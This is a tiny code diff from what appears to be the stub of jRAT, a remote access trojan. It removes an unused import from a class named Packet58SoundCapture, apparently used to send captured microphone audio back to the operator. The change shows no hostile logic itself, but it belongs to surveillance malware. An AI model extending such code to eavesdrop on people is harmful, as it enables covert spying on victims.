@@ -3,7 +3,6 @@ package se.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 
 import se.jrat.common.io.StringWriter;
-import se.jrat.stub.Connection;
 
 
 public class Packet58SoundCapture extends AbstractOutgoingPacket {
